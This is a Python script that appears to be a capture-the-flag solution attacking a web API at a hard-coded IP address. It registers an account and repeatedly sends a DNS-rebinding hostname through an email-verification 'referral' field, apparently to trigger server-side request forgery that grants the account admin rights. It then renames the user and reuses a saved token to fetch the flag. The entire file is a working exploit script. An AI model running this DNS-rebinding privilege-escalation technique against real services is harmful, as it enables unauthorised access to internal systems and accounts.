import httpx

URL = "http://128.199.111.38:9101/v1"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)
    def register(self, name, email,password):
        self.name = name
        self.email = email
        self.password = password
        r = self.c.post('/auth/register', data={
            'name': self.name,
            'email': self.email,
            'password': self.password
        })
        if r.status_code == 201:
            print('register success')
        else:
            print('register failed')
            print(r.text)
            exit()
            
        self.refresh_token = r.json()["tokens"]["refresh"]["token"]
    
    def login(self, name="" ,email="", password="", token=""):
        r = self.c.post('/auth/login', data={
            'name': name or self.name,
            'email': email or self.email,
            'password': password or self.password,
            'token': token
        })
        if r.status_code == 200 or r.status_code == 401: # 401 means already assigned our roles.
            print('login success')
        else:
            print('login failed')
            print(r.text)
            exit()
            
        try:
            self.access_token = r.json()["tokens"]["access"]["token"]
            self.my_id = r.json()["user"]["id"]
        except:
            self.access_token = token
            pass
            
        return self.access_token
    def verify(self, payload_dns_rebinding="ac150003.c0a80001.rbndr.us"):
        while True:
            r = self.c.post('/auth/verify-email', data={'refferal': payload_dns_rebinding},headers={
                "Authorization": f"Bearer {self.access_token}"
            })
            if r.status_code == 200:
                print('verify success')
                break
            else:
                print('verify failed... retrying rebinding...')
                print(r.text)
            __import__('time').sleep(1.5)
    
    
    def updateUser(self,name, email):
        r = self.c.patch(f'/users/{self.my_id}', data={  
            'name': name,
            'email': email,
            'password': self.password
        },headers={"Authorization": f"Bearer {self.access_token}"})
        if r.status_code == 200:
            print('update success')
        else:
            print('update failed')
            print(r.url)
            print(r.text)
            exit()
            
    def flag(self):
         r = self.c.get(f'/users/flag', headers={"Authorization": f"Bearer {self.access_token}"})
         print(r.text)
         
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    rand_id_1 = __import__("random").randint(1000,9999)
    api.register(name="halalkandlule",email=f"haxorkan{rand_id_1}@test.com",password="test1234567")
    api.login()
    api.verify()
    last_token = api.login() # make sure the token is not expired after we brute the dns rebinding and applying to make our user roles to admin
    rand_id_2 = __import__("random").randint(1000,9999)
    api.updateUser(name="flag", email=f"haxorkanle{rand_id_2}@test.com")
    api.login(email=f"haxorkanle{rand_id_2}@test.com",password="test1234567",token=last_token)
    api.flag()
    